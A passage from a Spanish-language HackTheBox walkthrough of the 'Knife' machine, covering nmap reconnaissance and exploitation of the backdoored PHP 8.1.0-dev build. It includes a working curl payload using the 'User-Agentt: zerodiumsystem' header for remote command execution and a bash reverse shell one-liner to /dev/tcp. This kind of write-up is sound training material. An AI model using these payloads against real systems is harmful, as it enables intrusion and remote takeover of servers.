Knife es una máquina linux de nivel fácil, creada por MrKN16H7, en la que vamos a explotar un bug de PHP para conseguir una RCE y ejecutar un binario como root para convertirnos en él.

imagen

Según los seres vivos que hay por HackTheBox, la máquina es así:

imagen

Muy CTF(y es así)

1 - Reconocimiento inicial 2 - Reconocimiento profundo 3 - Explotación
[Reconocimiento inicial] {#recon}

# Nmap 7.92 scan initiated Fri Aug 27 20:20:39 2021 as: nmap -p- --open --min-rate 3000 -sS -Pn -n -v 10.10.10.242 -oG ports -oN ports.nmap
Nmap scan report for 10.10.10.242
Host is up (0.30s latency).
Not shown: 51068 closed tcp ports (reset), 14465 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Aug 27 20:21:14 2021 -- 1 IP address (1 host up) scanned in 34.80 seconds

Pequeña explicación de los parámetros de nmap

    -p-: Escanea todos los puertos.
    --open: Solo muestra los que están abiertos.
    --min-rate: Envía un mínimo de paquetes por segundo para que vaya más rápido, con un número muy alto, como 10000, puede dar falsos positivos o negativos.
    -sS: TCP SYN Port Scan, agiliza un poco el escaneo ya que no espera a que se complete el Three-Way Handshake.
    -Pn: Deshabilita el descubrimiento de host mediante pings a la máquina para comprobar si está activa.
    -n: Deshabilita la resolución DNS
    -v: Muestra los puertos a medida que los descubre
    -oG: Guarda el escaneo de nmap en diferentes formatos, -oG lo guarda en formato grepeable, para luego usar la función extractPorts de s4vitar
    -oN: Guarda el escaneo como aparece por consola.

Los puertos abiertos son el 22, para obtener una shell segura(SSH), y 80, que hostea un servidor HTTP.
[Reconocimiento profundo] {deeprecon}

Ahora que tenemos los puertos abiertos de la máquina, vamos a enumerarlos(de forma básica) y a detectar la versión y servicio que corren.

❯ nmap -sCV -p22,80 10.10.10.242 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-28 15:47 CEST
Nmap scan report for 10.10.10.242
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds

Explotación {#exploit}

Si vamos a la página web, lo primero que encontramos es esto, un servidor Apache con PHP 8.1:

imagen

Si buscamos exploits para la versión de Apache que corre no encontramos nada, en cambio, si buscamos exploits para la versión de PHP que corre, encontramos uno muy interesante que nos permite ejecutar código mediante la cabecera User-Agentt: zerodiumsystem("[comando]"); en la petición.

    An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.

https://flast101.github.io/php-8.1.0-dev-backdoor-rce/

Esto se puede hacer de tres formas: con un script automatizado para ello, con cURL mediante el parámetro -H o interceptando la petición con BurpSuite y añadiendo esta cabecera.
Explotación con cURL

cURL tiene el parámetro -H, mediante el cual le puedes asignar más cabeceras a tu petición si son necesarias, entonces si le añadimos la cabecera User-Agentt: zerodiumsystem("[comando]"); podríamos ejecutar comandos a nivel de sistema en la máquina. El comando sería así:

❯ curl -s -H 'User-Agentt: zerodiumsystem("whoami");' 10.10.10.242 | grep -i doctype -B 1 | grep -v -i doctype

Le he añadido grep para ver únicamente el resultado del comando, que se encuentra al principio del código de la página web.
Explotación con BurpSuite

Con BurpSuite hay que interceptar la petición hacia la página web, y modificarla con la misma cabecera de antes. Es recomendable pasar la petición al Repeater con Ctrl + R para poder modificarla como quieras y sin tener que recargar la página cada vez que vayas a ejecutar el comando.
Conseguir una Reverse Shell

Ahora solo habría que ejecutar la Reverse Shell de siempre, si no la sabes es:

bash -i &> /dev/tcp/tuip/puertoEnElQueTienesNC 0&>1
